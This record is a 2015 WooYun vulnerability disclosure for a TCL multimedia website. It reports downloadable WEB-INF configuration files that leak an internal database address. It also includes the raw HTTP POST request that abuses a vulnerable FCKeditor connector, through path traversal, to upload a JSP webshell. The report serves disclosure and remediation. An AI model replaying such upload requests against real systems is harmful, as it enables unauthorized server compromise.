{"id": 46244, "wybug_id": "wooyun-2015-091995", "wybug_title": "tcl某站一种类型配置不当可getshell入内网", "wybug_corp": "TCL官方网上商城", "wybug_author": "杀器王子", "wybug_date": "2015-01-15 12:49", "wybug_open_date": "2015-03-01 12:50", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向公众公开  简要描述： tcl某站配置不当可getshell入内网 详细说明：  http://multimedia.tcl.com/WEB-INF/web.xmlweb.xml可访问\n\n顺着图一路摸下去http://multimedia.tcl.com/WEB-INF/classes/applicationContext.xmlhttp://multimedia.tcl.com/WEB-INF/classes/hibernate.cfg.xml\n<hibernate-configuration><session-factory><property name=\"hibernate.connection.url\">\t\t\tjdbc:mysql://10.120.99.19/multimedia?useServerPrepStmts=false&useUnicode=true&characterEncoding=UTF-8&logger=com.mysql.jdbc.log.StandardLogger\t\t</property>\n找到数据库连接 在内网每个classes都是可以下载的 可导致整站源码泄露   漏洞证明：  重点在这里\n\nfckeditor访问后发现是有漏洞的版本 可以跨目录\nPOST /lokosuite/module/core/htmleditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=Image&CurrentFolder=/../../en/home/ HTTP/1.1Host: multimedia.tcl.comProxy-Connection: keep-aliveContent-Length: 7338Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://multimedia.tcl.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.3 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMqgpH9KZNXlFibX4Referer: http://multimedia.tcl.com/lokosuite/module/core/htmleditor/editor/filemanager/browser/default/frmupload.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: JSESSIONID=EC6CB4E9F7907F950BB61462522B06DF; __utmt=1; __utma=168697661.1185858053.1421290181.1421290181.1421290181.1; __utmb=168697661.8.10.1421290181; __utmc=168697661; __utmz=168697661.1421290181.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)------WebKitFormBoundaryMqgpH9KZNXlFibX4Content-Disposition: form-data; name=\"NewFile\"; filename=\"indexs.jsp\"Content-Type: application/octet-stream\n这个包直接上传shell\n\n   修复方案：  禁止访问配置文件   版权声明：转载请注明来源 杀器王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-15 13:36 厂商回复： 感谢你的工作，已转交相关单位处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-15 13:26 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  围观 大杀器    \n     2015-01-26 09:16 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  好东西，web.xml好东西    \n     2015-03-01 13:02 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  其实第一次要我写程序我是拒绝的，因为，你不能让我写，我就马上去写，第一我要学一下，因为我不愿意写完了以后再查出一些bug出来，数据库duang一下被爆了，很黑、很卡，这样用户出来一定会骂我，根本没有这样的程序，就证明程序猿都是假的。后来我也经过证实程序确实是有漏洞的，我写了大概一个月左右，感觉还不错，后来我在上线的时候也要求他们不要加防火墙，因为我要让用户看到，我用完之后是这个样子，你们用完之后也会是这个样子！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}